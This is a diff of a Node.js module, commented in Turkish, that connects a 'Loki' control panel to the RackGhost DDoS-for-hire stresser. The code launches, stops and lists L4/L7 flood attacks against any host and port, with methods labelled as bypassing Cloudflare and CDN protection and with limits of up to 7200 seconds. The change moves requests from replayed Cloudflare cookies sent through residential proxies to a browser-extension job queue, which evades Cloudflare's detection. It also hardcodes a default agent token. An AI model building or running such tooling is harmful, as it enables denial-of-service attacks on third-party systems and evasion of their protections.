@@ -2,29 +2,25 @@
  * rackghost.js
  * RackGhost stresser entegrasyonu (stresse.st alternatifi provider).
  *
- * RackGhost'un public API'si yok; panelin kendi ic API'si
- * (panel/stresser_api.php) kullaniliyor. Kimlik dogrulama:
- * cf_clearance (Cloudflare) + PHPSESSID cookie'leri, sabit UA ve
- * residential proxy uzerinden. Cookie'ler Cloudflare/IP kilitli oldugu
- * icin proxy ZORUNLU (ayni cikis IP'si).
+ * RackGhost'un public API'si yok ve Cloudflare sunucu tarafli istemcileri
+ * reddediyor (cookie replay tespiti). Bu yuzden istekler KULLANICININ
+ * TARAYICISINDA calisan Loki Agent eklentisi uzerinden gider:
  *
- * Oturum verileri data/rackghost.json'da tutulur; panelden guncellenebilir.
- * Watchdog periyodik 'ongoing' cagrisi yapar; oturum olmusse
- * Telegram'dan "yenileme lazim" bildirimi atar.
+ *   Loki panel -> backend is kuyrugu -> eklenti poll -> rackghost (kullanicinin
+ *   Chrome'u, kendi oturumu+proxy'si) -> eklenti sonucu backend'e postalar.
+ *
+ * Eklenti cevrimdisi ise cagrilar bekler/timeout olur ve watchdog Telegram'dan
+ * "agent cevrimdisi" bildirimi atar.
+ *
+ * Method/limit bilgisi panelin stresser sayfasindan sabitlendi.
  */
 
-const fs = require('fs');
-const path = require('path');
-const axios = require('axios');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { sendTelegram, esc } = require('./telegram');
+const { sendTelegram } = require('./telegram');
 
-const DATA_DIR = path.join(__dirname, 'data');
-const STATE_FILE = path.join(DATA_DIR, 'rackghost.json');
+const API_WAIT_TIMEOUT_MS = 90000;
+const AGENT_OFFLINE_MS = 60 * 1000; // bu sure poll gelmezse agent offline sayilir
+const WATCHDOG_INTERVAL_MS = 5 * 60 * 1000;
 
-const API_URL = 'https://rackghost.com/panel/stresser_api.php';
-
-// Paneldeki stres sayfasindaki method listesi (value -> etiket)
 const METHODS = [
   { value: 'SOUNDV3', label: '[BETA] SOUND-V3 (HTTPS/HTTP3) [CF]', layer: 'L7' },
   { value: 'SPAMMERV3', label: '[BETA] SPAMMER v3 (HTTP/1.x HTTP/2) [CDN]', layer: 'L7' },
@@ -59,89 +55,74 @@ const METHODS = [
   { value: 'UDPTCPMIX', label: 'UDP+TCP Mix', layer: 'L4' }
 ];
 
-// Paneldeki limitler (stres sayfasi: conc max 15, time max 7200)
 const LIMITS = { maxTime: 7200, maxConcurrents: 15 };
-const WATCHDOG_INTERVAL_MS = 10 * 60 * 1000;
+const AGENT_TOKEN = process.env.LOKI_RG_AGENT_TOKEN || 'rg-agent-loki-2026';
 
-let state = {
-  cfClearance: '',
-  sessionId: '',
-  userAgent: '',
-  proxy: '',
-  api: 2, // 1=VAC, 2=RACK (varsayilan backend)
-  lastOkAt: null,
-  lastError: null,
-  alerted: false
-};
+// Is kuyrugu: id -> { payload, result, resolve, createdAt }
+const jobs = new Map();
+let jobSeq = 0;
+let lastAgentPollAt = null;
+let lastOkAt = null;
+let lastError = null;
+let offlineAlerted = false;
 let watchdogTimer = null;
 
-function loadState() {
-  try {
-    if (fs.existsSync(STATE_FILE)) {
-      state = { ...state, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf8')) };
+function nextJobId() {
+  jobSeq += 1;
+  return `job_${Date.now()}_${jobSeq}`;
+}
+
+/** Agent'in alacagi bekleyen is (varsa hemen, yoksa long-poll). */
+function takeJob() {
+  for (const [id, job] of jobs) {
+    if (!job.taken) {
+      job.taken = true;
+      return { id, payload: job.payload };
     }
-  } catch (err) {
-    console.warn('[rackghost] state okunamadi:', err.message);
   }
+  return null;
 }
 
-function saveState() {
-  try {
-    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
-  } catch (err) {
-    console.warn('[rackghost] state yazilamadi:', err.message);
-  }
-}
-
-function isConfigured() {
-  return Boolean(state.cfClearance && state.sessionId && state.userAgent && state.proxy);
-}
-
-function getClient() {
-  if (!isConfigured()) {
-    const err = new Error('RackGhost oturumu yapilandirilmamis (cookie/proxy eksik)');
-    err.statusCode = 503;
-    throw err;
-  }
-  return axios.create({
-    baseURL: 'https://rackghost.com',
-    timeout: 30000,
-    proxy: false,
-    httpAgent: new HttpsProxyAgent(state.proxy),
-    httpsAgent: new HttpsProxyAgent(state.proxy),
-    headers: {
-      'User-Agent': state.userAgent,
-      'Accept': 'application/json, text/plain, */*',
-      'Content-Type': 'application/json',
-      'Cookie': `cf_clearance=${state.cfClearance}; PHPSESSID=${state.sessionId}`,
-      'Origin': 'https://rackghost.com',
-      'Referer': 'https://rackghost.com/panel/stresser.php'
-    }
+/** Yeni is kuyruga ekle ve agent'in sonucunu bekle. */
+function enqueue(payload) {
+  const id = nextJobId();
+  return new Promise((resolve, reject) => {
+    const timeout = setTimeout(() => {
+      jobs.delete(id);
+      const err = new Error('RackGhost agent cevap vermedi (eklenti cevrimdisi olabilir)');
+      err.agentOffline = true;
+      reject(err);
+    }, API_WAIT_TIMEOUT_MS);
+    jobs.set(id, {
+      payload,
+      taken: false,
+      createdAt: Date.now(),
+      resolve: (result) => {
+        clearTimeout(timeout);
+        jobs.delete(id);
+        if (result && result.ok) {
+          lastOkAt = new Date().toISOString();
+          lastError = null;
+          offlineAlerted = false;
+          resolve(result.data);
+        } else {
+          lastError = (result && result.error) || 'agent hatasi';
+          reject(new Error(lastError));
+        }
+      }
+    });
   });
 }
 
 async function apiCall(payload) {
-  const client = getClient();
-  const res = await client.post('/panel/stresser_api.php', payload);
-  const data = res.data;
-  // Cloudflare challenge HTML'i JSON yerine gelirse oturum dusmus demektir
-  if (typeof data === 'string') {
-    const err = new Error('RackGhost oturumu gecersiz (CF challenge dondu)');
-    err.sessionExpired = true;
-    throw err;
-  }
-  state.lastOkAt = new Date().toISOString();
-  state.lastError = null;
-  state.alerted = false;
-  saveState();
-  return data;
+  return enqueue(payload);
 }
 
 /** Saldiri baslat. params: {host, port, time, concurrents, method} */
 async function startAttack(params) {
   const data = await apiCall({
     action: 'start',
-    api: state.api,
+    api: 2,
     params: {
       host: params.host,
       port: parseInt(params.port),
@@ -150,8 +131,8 @@ async function startAttack(params) {
       method: String(params.method).toUpperCase()
     }
   });
-  if (!data.success) {
-    throw new Error(data.message || data.error || 'RackGhost saldiri baslatamadi');
+  if (!data || !data.success) {
+    throw new Error(data?.message || data?.error || 'RackGhost saldiri baslatamadi');
   }
   const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
   return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items };
@@ -159,71 +140,91 @@ async function startAttack(params) {
 
 /** Saldiri durdur (id + host gerekli) */
 async function stopAttack(id, host) {
-  const data = await apiCall({ action: 'stop', api: state.api, id: String(id), host });
-  return data;
+  return apiCall({ action: 'stop', api: 2, id: String(id), host });
 }
 
 /** Aktif saldirilar */
 async function getOngoing() {
-  const data = await apiCall({ action: 'ongoing', api: state.api });
-  return Array.isArray(data.data) ? data.data : [];
+  const data = await apiCall({ action: 'ongoing', api: 2 });
+  return data && Array.isArray(data.data) ? data.data : [];
 }
 
 function getMethods() {
   return METHODS;
 }
 
+function isConfigured() {
+  return true; // agent tabanli; cookie gerekmez
+}
+
+function agentOnline() {
+  return lastAgentPollAt && (Date.now() - lastAgentPollAt) < AGENT_OFFLINE_MS;
+}
+
 function getStatus() {
   return {
-    configured: isConfigured(),
-    api: state.api,
-    lastOkAt: state.lastOkAt,
-    lastError: state.lastError,
+    configured: true,
+    agentOnline: agentOnline(),
+    lastAgentPollAt: lastAgentPollAt ? new Date(lastAgentPollAt).toISOString() : null,
+    lastOkAt,
+    lastError,
+    pendingJobs: jobs.size,
     limits: LIMITS
   };
 }
 
-/** Cookie/proxy bilgilerini guncelle (panelden). */
-function updateConfig(fields) {
-  if (fields.cfClearance !== undefined) state.cfClearance = String(fields.cfClearance).trim();
-  if (fields.sessionId !== undefined) state.sessionId = String(fields.sessionId).trim();
-  if (fields.userAgent !== undefined) state.userAgent = String(fields.userAgent).trim();
-  if (fields.proxy !== undefined) state.proxy = String(fields.proxy).trim();
-  if (fields.api !== undefined) state.api = parseInt(fields.api) === 1 ? 1 : 2;
-  state.alerted = false;
-  saveState();
-  return getStatus();
+// ---- Agent endpoint'leri icin handler'lar ----
+
+function handleAgentPoll(req, res) {
+  const token = req.headers['x-agent-token'] || req.query.token;
+  if (token !== AGENT_TOKEN) return res.status(401).json({ error: 'unauthorized' });
+  lastAgentPollAt = Date.now();
+  offlineAlerted = false;
+  const job = takeJob();
+  if (job) return res.json({ job });
+  // Long-poll: 25sn bekle, is gelirse hemen dondur
+  const started = Date.now();
+  const timer = setInterval(() => {
+    const j = takeJob();
+    if (j) {
+      clearInterval(timer);
+      return res.json({ job: j });
+    }
+    if (Date.now() - started > 25000) {
+      clearInterval(timer);
+      return res.json({ job: null });
+    }
+  }, 500);
+  req.on('close', () => clearInterval(timer));
+}
+
+function handleAgentResult(req, res) {
+  const token = req.headers['x-agent-token'] || req.query.token;
+  if (token !== AGENT_TOKEN) return res.status(401).json({ error: 'unauthorized' });
+  const { id, result } = req.body || {};
+  const job = jobs.get(id);
+  if (!job) return res.status(404).json({ error: 'job bulunamadi (timeout olmus olabilir)' });
+  job.resolve(result || { ok: false, error: 'bos sonuc' });
+  res.json({ ok: true });
 }
 
 async function watchdogTick() {
-  if (!isConfigured()) return;
-  try {
-    await getOngoing();
-  } catch (err) {
-    state.lastError = err.message;
-    saveState();
-    if (err.sessionExpired && !state.alerted) {
-      state.alerted = true;
-      saveState();
-      sendTelegram(
-        `⚠️ <b>RackGhost oturumu düştü</b>\n` +
-        `Cloudflare cookie süresi doldu veya proxy reddedildi.\n` +
-        `Yeni cf_clearance + PHPSESSID panelden girilmeli (RackGhost ayarlari).`
-      ).catch(() => {});
-    }
+  if (!agentOnline() && !offlineAlerted) {
+    offlineAlerted = true;
+    sendTelegram(
+      `⚠️ <b>RackGhost agent çevrimdışı</b>\n` +
+      `Loki Agent eklentisi ${Math.round(AGENT_OFFLINE_MS / 1000)} saniyedir yok.\n` +
+      `Proxy'li Chrome kapaliysa ac; eklenti calisiyor mu kontrol et.`
+    ).catch(() => {});
   }
 }
 
 function initRackghost() {
-  loadState();
   if (watchdogTimer) clearInterval(watchdogTimer);
   watchdogTimer = setInterval(() => {
     watchdogTick().catch((err) => console.warn('[rackghost] watchdog:', err.message));
   }, WATCHDOG_INTERVAL_MS);
-  if (isConfigured()) {
-    watchdogTick().catch(() => {});
-  }
-  console.log(`[rackghost] init: configured=${isConfigured()} api=${state.api}`);
+  console.log('[rackghost] init: agent-kuyruk modu (tarayici ici ajan)');
 }
 
 module.exports = {
@@ -233,7 +234,9 @@ module.exports = {
   getOngoing,
   getMethods,
   getStatus,
-  updateConfig,
   isConfigured,
+  agentOnline,
+  handleAgentPoll,
+  handleAgentResult,
   LIMITS
 };
